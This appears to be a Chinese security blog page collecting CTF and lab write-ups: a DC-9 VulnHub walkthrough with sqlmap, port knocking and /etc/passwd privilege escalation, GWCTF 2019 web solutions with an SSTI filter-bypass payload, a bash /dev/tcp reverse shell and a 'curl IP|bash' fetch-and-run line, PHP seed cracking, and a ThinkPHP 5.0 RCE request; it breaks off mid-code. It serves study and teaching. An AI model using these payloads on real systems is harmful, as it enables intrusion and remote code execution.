<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/page/3/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-DC9-vulnhub渗透测试" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/25/DC9-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="article-date">
  <time datetime="2020-02-25T13:58:27.000Z" itemprop="datePublished">2020-02-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/02/25/DC9-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">DC9-vulnhub渗透测试</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>DC:9-vlunhub渗透测试</p>
<p>靶机IP: 192.168.1.156</p>
<p>kaliIP: 192.168.1.124</p>
<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p>首先namp扫描端口</p>
<p><img src="/.com//12.png" alt="image-20200212160748092"></p>
<p>先看到80端口，访问80端口</p>
<p><img src="/.com//13.png" alt="image-20200212160845248"></p>
<p>在search.php中存在<strong>sql注入漏洞</strong></p>
<p><img src="/.com//16.png" alt="image-20200212161545997"></p>
<p><img src="/.com//14.png" alt="image-20200212161452403"></p>
<p><img src="/.com//15.png" alt="image-20200212161513174"></p>
<p>然后跑一下sqlmap</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://192.168.1.156/search.php" <span class="comment">--data="search=1'"</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//1.png" alt="image-20200212010027411"></p>
<p>确实存在漏洞，然后一路跑库</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    sqlmap -u <span class="string">"http://192.168.1.156/search.php"</span> --data=<span class="string">"search=1'"</span> -dbs</span><br><span class="line"></span><br><span class="line">    sqlmap -u <span class="string">"http://192.168.1.156/search.php"</span> --data=<span class="string">"search=1'"</span> -D 数据库名 -tables</span><br><span class="line"></span><br><span class="line">    sqlmap -u <span class="string">"http://192.168.1.156/search.php"</span> --data=<span class="string">"search=1'"</span> -D 数据库名 -T 数据表名 -columns</span><br><span class="line">        </span><br><span class="line">    sqlmap -u <span class="string">"http://192.168.1.156/search.php"</span> --data=<span class="string">"search=1'"</span> -D 数据库名</span><br><span class="line">-T 数据表名 -C <span class="string">"字段1，字段2..."</span> --dump</span><br></pre></td></tr></table></figure>

<p><img src="/.com//2.png" alt="image-20200212010202886"></p>
<p>最后跑出这个数据，就是admin的密码</p>
<p>登陆后发现这里可能存在LFI</p>
<p><img src="/.com//17.png" alt="image-20200212162414010"></p>
<p><img src="/.com//18.png" alt="image-20200212162616652"></p>
<p><strong>——————————-划重点————————–</strong></p>
<p>最早我们有看到一个22（ssh）端口。但这里的ssh服务是启动了knock协议的。</p>
<p>参考文章：</p>
<p><a href="https://www.ibm.com/developerworks/cn/aix/library/au-sshlocks/index.html" target="_blank" rel="noopener">保护 SSH 的三把锁</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/43716885" target="_blank" rel="noopener">如何使用knockd让黑客看不见你的服务器?</a></p>
<p>这也是为什么最早nmap扫描的时候，看到的ssh端口是filterd的</p>
<p><img src="/.com//19.png" alt="image-20200212163136615"></p>
<p>查看knock的配置</p>
<p><img src="/.com//3.png" alt="image-20200212021350629"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">执行命令：</span><br><span class="line">apt-get install knock</span><br><span class="line">knock <span class="number">192.168</span><span class="number">.1</span><span class="number">.156</span> <span class="number">7469</span>,<span class="number">8475</span>,<span class="number">9842</span></span><br></pre></td></tr></table></figure>





<p>下图是我们在数据库中跑出的数据，看看能不能和ssh的登录账号密码“撞库”</p>
<p><img src="/.com//5.png" alt="image-20200212025746714"></p>
<p>跑出如下账号</p>
<p><img src="/.com//4.png" alt="image-20200212025659414"></p>
<p>janitor登录后，发现如下文件</p>
<p><img src="/.com//7.png" alt="image-20200212030550008"></p>
<p>再使用hydra跑一下。又跑出一个账号，密码。</p>
<p><img src="/.com//6.png" alt="image-20200212030513642"></p>
<p>转到<code>fredf</code></p>
<p><code>su fredf</code>，然后<code>sudo -l</code></p>
<p>发现这里可以使用<code>root权限下的/opt/devstuff/dist/test/test</code></p>
<p><img src="/.com//8.png" alt="image-20200212030730925"></p>
<p>然后查看test.py的内容（/opt/devstuff/dist/test/test实际就是执行test.py的内容，可通过命令<code>find / -name test.py 2&gt;/dev/null</code>寻找脚本内容，cat查看内容）</p>
<p><img src="/.com//10.png" alt="image-20200212032957775"></p>
<p>这是一个读文件，写入文件的脚本呢，因为可以使用root权限，所以我们往<code>/etc/passwd</code>下写入一个超级用户。然后提权即可</p>
<p><img src="/.com//9.png" alt="image-20200212032854554"></p>
<p><img src="/.com//11.png" alt="image-20200212033051219"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>knock协议学到了</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/25/DC9-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="ck8sqr5i1000bkou5dvtx2mqr" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-GWCTF-2019-web" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/21/GWCTF-2019-web/" class="article-date">
  <time datetime="2020-02-21T13:41:04.000Z" itemprop="datePublished">2020-02-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/02/21/GWCTF-2019-web/">GWCTF 2019-web</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="GWCTF-2019-web"><a href="#GWCTF-2019-web" class="headerlink" title="GWCTF 2019-web"></a>GWCTF 2019-web</h1><p>GWCTF 2019-web</p>
<h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><h2 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h2><p><img src="/.com//1.png" alt="image-20200324112248986"></p>
<p>猜这里有SSTI</p>
<p>发现这里强过滤了，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>只要一用就报错，所以使用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% %&#125;</span><br></pre></td></tr></table></figure>



<p>构造exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">''</span>.<span class="keyword">__class__</span>.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].os.system(<span class="string">'执行的命令'</span>) %&#125;<span class="number">1</span>&#123;% <span class="keyword">endif</span> %&#125;</span><br></pre></td></tr></table></figure>



<p>这里记一个<code>FUzz-SSTI</code>的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">dic = [<span class="string">'class'</span>, <span class="string">'bases'</span>, <span class="string">'subclasses'</span>, <span class="string">'['</span>, <span class="string">'('</span>, <span class="string">'read'</span>, <span class="string">'mro'</span>, <span class="string">'init'</span>, <span class="string">'globals'</span>, <span class="string">'builtins'</span>, <span class="string">'file'</span>, <span class="string">'func_globals'</span>, <span class="string">'linecache'</span>, <span class="string">'system'</span>, <span class="string">'values'</span>, <span class="string">'import'</span>, <span class="string">'module'</span>, <span class="string">'call'</span>, <span class="string">'name'</span>, <span class="string">'getitem'</span>, <span class="string">'pop'</span>, <span class="string">'args'</span>, <span class="string">'path'</span>, <span class="string">'popen'</span>, <span class="string">'eval'</span>, <span class="string">'end'</span>, <span class="string">'for'</span>, <span class="string">'if'</span>, <span class="string">'config'</span>]</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://24702b70-5fd1-4537-9f46-e3826566a052.node3.buuoj.cn/"</span>        </span><br><span class="line">pass_dic = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">    data = &#123;</span><br><span class="line">            <span class="string">"name"</span>: <span class="string">"ads"</span>+i+<span class="string">"ads"</span></span><br><span class="line">            &#125;</span><br><span class="line">    res = requests.post(url, data=data)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> len(res.text) == <span class="number">1194</span>:</span><br><span class="line">        pass_dic.append(i)</span><br><span class="line">        print(pass_dic)</span><br></pre></td></tr></table></figure>

<p>被过滤掉的字符有</p>
<p><img src="/.com//2.png" alt="image-20200324191111500"></p>
<p>发现<code>iconfigf</code>可以绕过对关键词的过滤</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconfigf ==&gt; if</span><br></pre></td></tr></table></figure>



<p>通过SSTI以及<code>curl</code>反弹shell</p>
<p>在内网开一个主机，在index.html写上</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">174.1</span><span class="number">.90</span><span class="number">.244</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>exp改为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% iconfigf <span class="string">''</span>.__clconfigass__.__mconfigro__[<span class="number">2</span>].__subclaconfigsses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].oconfigs.system(<span class="string">'curl 174.1.90.244|bash'</span>) %&#125;<span class="number">1</span>&#123;% endiconfigf %&#125;</span><br></pre></td></tr></table></figure>





<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>考点：CVE-2018-12613</p>
<p><img src="/.com//3.png" alt="image-20200325083832042"></p>
<h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p>考点：随机数预测</p>
<p><code>check.php</code>查看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'seed'</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'num'</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure>

<p>关键代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br></pre></td></tr></table></figure>

<p><code>mt_srand</code>生成的种子是可以爆破的。</p>
<p>先使用脚本把随机数转换一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2 = <span class="string">'MAijTMEfFK'</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += str(j) + <span class="string">' '</span> + str(j) + <span class="string">' '</span> + <span class="string">'0'</span> + <span class="string">' '</span> + str(len(str1)<span class="number">-1</span>) + <span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<p><img src="/.com//4.png" alt="image-20200325085411806"></p>
<p>接着是使用<code>php_mt_seed</code>将种子爆破出来</p>
<p><img src="/.com//5.png" alt="image-20200325085757343"></p>
<p>然后爆破</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">mt_srand(<span class="number">48815515</span>);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str = <span class="string">''</span>;</span><br><span class="line">$len1 = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len1; $i++) &#123;</span><br><span class="line">    $str .= substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span> . $str . <span class="string">"&lt;/p&gt;"</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/.com//6.png" alt="image-20200325090016209"></p>
<p>提交获得flag</p>
<p><img src="/.com//7.png" alt="image-20200325090046508"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/21/GWCTF-2019-web/" data-id="ck8sqr5i3000ckou5e90575bh" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-ThinkPHP-5-0-0-5-0-23-RCE-漏洞分析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/17/ThinkPHP-5-0-0-5-0-23-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
  <time datetime="2020-02-17T13:47:34.000Z" itemprop="datePublished">2020-02-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/02/17/ThinkPHP-5-0-0-5-0-23-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</p>
<p>我用的是5.0.22版本</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>exp如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/TP5022/public/index.php?s=captcha</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;get[]=<span class="number">-1</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//1.png" alt="image-20200310132323341"></p>
<p>使用debug分析漏洞触发,然后我们跟进这个<code>run()</code></p>
<p><img src="/.com//2.png" alt="image-20200310132718714"></p>
<p>我们的url为<code>http://127.0.0.1/TP5022/public/index.php?s=captcha</code></p>
<p>在<code>run（）</code>中经过一系列的配置加载，后进行url检测</p>
<p><img src="/.com//3.png" alt="image-20200310133000452"></p>
<p>一路跟进至<code>routeCheck()</code>函数</p>
<p><img src="/.com//4.png" alt="image-20200310133113456"></p>
<p>进入这个函数</p>
<p><img src="/.com//5.png" alt="image-20200310133154656"></p>
<p>这时候看到debug中获取到</p>
<p><img src="/.com//6.png" alt="image-20200310133215672"></p>
<p>看到路由检测</p>
<p><img src="/.com//7.png" alt="image-20200310133501785"></p>
<p>跟进<code>Route::check()</code>函数，在该函数中，我们可以看到</p>
<p><img src="/.com//8.png" alt="image-20200310133702333"></p>
<p><img src="/.com//9.png" alt="image-20200310134326523"></p>
<p>在这个函数中,以下关键代码：</p>
<p><img src="/.com//10.png" alt="image-20200310135350971"></p>
<p>其中<code>var_method</code>为<code>_method</code>，而我们POST了一个<code>_method=__construct</code></p>
<p>所以这时候</p>
<p><img src="/.com//11.png" alt="image-20200310140002170"></p>
<p>将会去调用，以下函数</p>
<p><img src="/.com//12.png" alt="image-20200310140026387"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($options <span class="keyword">as</span> $name =&gt; $item) &#123;</span><br><span class="line">    <span class="keyword">if</span> (property_exists(<span class="keyword">$this</span>, $name)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$name = $item;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用foreach循环，和POST传入数组即可对<code>Request</code>对象的成员属性进行覆盖。其中<code>$this-&gt;filter</code>保存着全局过滤规则。经过覆盖，相关变量变为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span></span><br><span class="line">    method = <span class="string">"get"</span></span><br><span class="line">    get = &#123;<span class="keyword">array</span>&#125; [<span class="number">0</span>]</span><br><span class="line">        <span class="number">0</span> = dir</span><br><span class="line">    filter =  &#123;<span class="keyword">array</span>&#125; [<span class="number">0</span>]</span><br><span class="line">        <span class="number">0</span> = system</span><br></pre></td></tr></table></figure>



<p>因为我的url如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;TP5022&#x2F;public&#x2F;index.php?s&#x3D;captcha</span><br></pre></td></tr></table></figure>

<p>所以获得</p>
<p><img src="/.com//13.png" alt="image-20200310140546354"></p>
<p>回到<code>run()</code></p>
<p><img src="/.com//14.png" alt="image-20200310142329511"></p>
<p>跟进<code>exec()</code>，到<code>case: &#39;method&#39;</code></p>
<p><img src="/.com//15.png" alt="image-20200310142441264"></p>
<p>跟进<code>$vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);</code></p>
<p><img src="/.com//16.png" alt="image-20200310143800700"></p>
<p><img src="/.com//17.png" alt="image-20200310143841087"></p>
<p><img src="/.com//18.png" alt="image-20200310143907189"></p>
<p><img src="/.com//19.png" alt="image-20200310143938756"></p>
<p>跟进<code>input()</code></p>
<p><img src="/.com//20.png" alt="image-20200310144039824"></p>
<p><img src="/.com//21.png" alt="image-20200310144104203"></p>
<p><img src="/.com//22.png" alt="image-20200310144130550"></p>
<p>然后调用<code>call_user_func</code>执行<code>phpinfo()</code></p>
<p>调用栈如下：</p>
<p><img src="/.com//23.png" alt="image-20200310144233491"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/3845#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845#toc-1</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/17/ThinkPHP-5-0-0-5-0-23-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="ck8sqr5iy000mkou55g4r38oy" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-phpcmsv9任意文件下载漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/14/phpcmsv9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2020-02-14T05:26:06.000Z" itemprop="datePublished">2020-02-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/02/14/phpcmsv9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/">phpcmsv9任意文件下载漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/14/phpcmsv9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" data-id="ck8sqr5k50017kou5hidx877g" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-phpcmsv9任意文件上传漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/10/phpcmsv9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2020-02-10T14:24:31.000Z" itemprop="datePublished">2020-02-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/02/10/phpcmsv9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">phpcmsv9任意文件上传漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>phpcmsv9任意文件上传漏洞</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>定位：<code>./phpcms/modules/member/index.php::register.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;_session_start();</span><br><span class="line">	<span class="comment">//获取用户siteid</span></span><br><span class="line">	$siteid = <span class="keyword">isset</span>($_REQUEST[<span class="string">'siteid'</span>]) &amp;&amp; trim($_REQUEST[<span class="string">'siteid'</span>]) ? intval($_REQUEST[<span class="string">'siteid'</span>]) : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">//定义站点id常量</span></span><br><span class="line">	<span class="keyword">if</span> (!defined(<span class="string">'SITEID'</span>)) &#123;</span><br><span class="line">	   define(<span class="string">'SITEID'</span>, $siteid);</span><br><span class="line">	&#125;</span><br><span class="line">	... ...</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'dosubmit'</span>])) &#123;</span><br><span class="line">		<span 